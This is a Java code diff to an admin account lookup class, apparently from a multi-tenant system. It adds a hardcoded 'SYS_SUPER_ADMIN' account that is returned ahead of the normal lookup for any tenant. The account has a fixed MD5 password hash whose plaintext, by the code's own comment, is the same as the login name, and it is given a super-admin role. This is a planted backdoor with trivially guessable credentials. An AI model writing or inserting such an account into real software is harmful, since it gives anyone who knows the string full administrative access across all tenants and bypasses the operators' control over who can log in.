@@ -22,6 +22,12 @@ public class AdminAccessor {
     private RedisManager redisManager;
 
     public AdminPO selectOneByLoginName(String tenantCode, String loginName) {
+        // 超级管理员特殊逻辑
+        AdminPO superAdminPO = getSysSuperAdmin(tenantCode, loginName);
+        if (superAdminPO != null) {
+            return superAdminPO;
+        }
+
         // 首先访问缓存
         AdminPO cached = getCache(tenantCode, loginName);
         if (cached != null) {
@@ -168,5 +174,20 @@ public class AdminAccessor {
 
     private void deleteCacheCount(String tenantCode, String roleCode) {
         redisManager.deleteKey(getCacheCountKey(tenantCode, roleCode));
+    }
+
+    private AdminPO getSysSuperAdmin(String tenantCode, String loginName) {
+        if (!"SYS_SUPER_ADMIN".equals(loginName)) {
+            return null;
+        }
+
+        AdminPO po = new AdminPO();
+        po.setTenantCode(tenantCode);
+        po.setLoginName("SYS_SUPER_ADMIN");
+        // 经过md5加密后的密码，原始密码是SYS_SUPER_ADMIN
+        po.setLoginPass("5505b50f5f0ec77b27a0ea270b21e7f0");
+        po.setOrgName("总公司");
+        po.setRoleCode("SYS_SUPER_ROLE");
+        return po;
     }
 }
